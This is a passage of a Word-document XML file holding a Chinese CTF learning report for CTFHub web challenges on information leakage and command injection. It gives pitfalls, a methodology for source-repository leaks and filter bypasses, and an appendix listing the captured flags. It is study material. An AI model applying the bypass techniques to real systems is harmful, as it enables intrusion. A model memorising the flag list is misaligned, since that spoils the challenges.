        <w:t xml:space="preserve"> 再编码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教训：用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$'\n'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 发真换行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22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 xml:space="preserve">坑：表单框里填 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%0a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 无效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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;input&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 单行 + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会被编码成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%25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23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坑：页面看不到 flag 但 Response 有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教训：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 HTML 里是"伪注释"，会被吃 → 用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>base64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4.3 方法论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三层递进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① 看得见    →  探测：把"有没有"变成确定的事实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（404 基线、状态码、title、固定路径表）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② 拿得到    →  搬运：知道路径就能取（目录 403 但文件能读）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（哈希路径 / 文件名编码）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③ 读得懂    →  解码：zlib / base64 / revlog 标记 / 编码转换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两个通用套路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套路 A：版本库泄露 = "探测 → 清单 → 取内容 → 解码"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套路 B：命令注入 = "找输入点 → 确认拼接 → 加分隔符 → 绕过滤"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三个反直觉认知（本任务最大收获）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strpos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 falsy —— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if (!strpos(...))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在"位置 0"时形同虚设</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>exec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 只收 stdout —— 空白 ≠ 没执行，可能只是报错走了 stderr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 HTML 里是注释开头 —— 浏览器渲染会吞掉，Response 才是真相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一句话总结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i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>信息泄露考的是"你知道该看哪里"，命令执行考的是"你知道能替换什么"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="454"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
      </w:pP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i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>两者的答案都不在教程里，在你自己的环境里 —— 所以必须复现。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:color="BFBFBF"/>
        </w:pBdr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附录 A：全部 flag 汇总（17 个）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信息泄露模块（9 + 5）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ctfhub{95c6f03d7cda19058d88ec1f}    网站源码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ctfhub{ff20cd30144373eedaa01abc}    bak 文件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ctfhub{1bbffdd2cca2f93ddc0ca8d8}    vim 缓存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ctfhub{2e801a81a591f99ffca80e07}    .DS_Store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ctfhub{dc8b0894d5a5689a22a35ffe}    Git Log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ctfhub{03f0f3f844084d7134cedad3}    Git Stash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ctfhub{b0571eeb61f6343ced553555}    Git 未删变体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ctfhub{6fd7676ba56da2a90a11af9a}    SVN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ctfhub{9260b70ead69a60fb2e0d968}    HG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ctfhub{1e5a12263055250cb6c8f170}    302 跳转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ctfhub{cf2690f992c9ebe484432aee}    Cookie 伪造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ctfhub{db7ba83bb0e787993a2fa43f}    基础认证 1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ctfhub{b227a7576366a4be3848faa5}    基础认证 2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ctfhub{d5b85603ca77329a3ae5a18}    Git 历史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命令执行模块（8）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ctfhub{64e8e0dae77db7d9c15ef8ab}    命令注入-无过滤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ctfhub{7234bb617c6421e4b8e40365}    eval 代码执行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ctfhub{5c3d2c0615beb813269640b6}    过滤 cat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ctfhub{7d4f698eda802c44829c9db7}    过滤空格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ctfhub{fba85d19b6751d803b3cee7c}    过滤目录分隔符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ctfhub{613d57ca6515a6b766b7caa0}    过滤运算符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ctfhub{7d928b22123076276bb32251}    综合练习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ctfhub{b4e8289cf23e6289829fb568}    文件包含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ctfhub{29c7fc65ea7034f067119535}    文件包含-php://input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ctfhub{95366c4682c791d1ff3f4272}    文件包含-filter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ctfhub{3e8215ea4ad95ff54cb15fe2}    文件包含-无 shell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独立复现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ctfhub{009ee4ed36138139d7349d59}    Git Log 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ctfhub{053da77b26b117ed9a380b03}    Git Stash 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ctfhub{52dd316df7c89131d95b8161}    HG 第二实例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附录 B：参考材料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notes/17-信息泄露漏洞.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：769 行，五类信息泄露 + 三库统一框架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notes/18-做题常见疑问.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：836 行，25 个实战问答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notes/20-信息泄露作业答案.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：403 行，五问完整答案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notes/21-PHP命令执行与绕过.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：546 行，8 函数实测 + 6 类绕过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writeups/靶场/CTFHub-GitStash.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：535 行，Stash 专题 WP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writeups/靶场/CTFHub-基础认证.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：494 行，Basic Auth 专题 WP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logs/2026-10-17.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：361 行，当日流水（含 12 条踩坑）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:color="BFBFBF"/>
        </w:pBdr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报告完成日期：2026-10-21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环境：WSL2 + Kali Rolling / PHP 8.4.24（本地实测）/ PHP 5.6.40（靶场）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